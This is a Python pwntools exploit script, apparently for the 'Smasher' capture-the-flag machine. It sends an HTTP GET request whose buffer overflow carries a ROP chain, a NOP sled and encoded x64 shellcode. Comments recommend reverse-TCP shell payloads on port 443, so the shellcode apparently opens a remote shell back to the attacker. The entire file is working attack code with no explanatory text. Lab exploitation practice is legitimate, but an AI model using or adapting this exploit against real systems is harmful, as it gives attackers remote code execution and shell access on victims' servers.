#!/usr/bin/python
 
from pwn import *
 
HOST = "10.10.10.89"
PORT = "1111"
 
r = remote(HOST, PORT)
 
#context.log_level = 'DEBUG'
 
junk = "A" * 568
 
rop_chain = flat (
    0x401106,       # 0x0000000000401106 : pop r13 ; ret
    0xe4ff,         # Hardcoded JMP RSP
    0x4010ff,       # 0x00000000004010ff : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
    "B" * 32,       # Junk
    0x4011dd,       # #0x00000000004011dd : pop rdi ; ret
    0x603500,       # 0x00603000        0x00604000         rwxp /root/Smasher/tiny (RDI <- 0x00603500)
    0x401304,       # 0x0000000000401304 : mov dword ptr [rdi + 4], eax ; ret
    0x603504,       # JMP RSP execution (0x603504)
    endianness = 'little', word_size = 64, sign = False)
 
nops = "\x90" * 40
 
# Badchars: \x00\x09\x0a\x0b\x0c\x0d\x20\x21
# Recommended payloads: linux/x64/shell_reverse_tcp or linux/x64/shell/reverse_tcp
# Always use LPORT = 443
 
shellcode =  ""
shellcode += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
shellcode += "\x05\xef\xff\xff\xff\x48\xbb\x13\x95\x3a\xe5\xaf"
shellcode += "\xcf\xee\x1a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += "\xff\xe2\xf4\x79\xbc\x62\x7c\xc5\xcd\xb1\x70\x12"
shellcode += "\xcb\x35\xe0\xe7\x58\xa6\xa3\x11\x95\x3b\x5e\xa5"
shellcode += "\xc5\xe1\x94\x42\xdd\xb3\x03\xc5\xdf\xb4\x70\x39"
shellcode += "\xcd\x35\xe0\xc5\xcc\xb0\x52\xec\x5b\x50\xc4\xf7"
shellcode += "\xc0\xeb\x6f\xe5\xff\x01\xbd\x36\x87\x55\x35\x71"
shellcode += "\xfc\x54\xca\xdc\xa7\xee\x49\x5b\x1c\xdd\xb7\xf8"
shellcode += "\x87\x67\xfc\x1c\x90\x3a\xe5\xaf\xcf\xee\x1a"
 
payload = 'GET ' + junk + urlencode(rop_chain) + nops + shellcode + '\r\n\r\n'
 
r.send(payload)
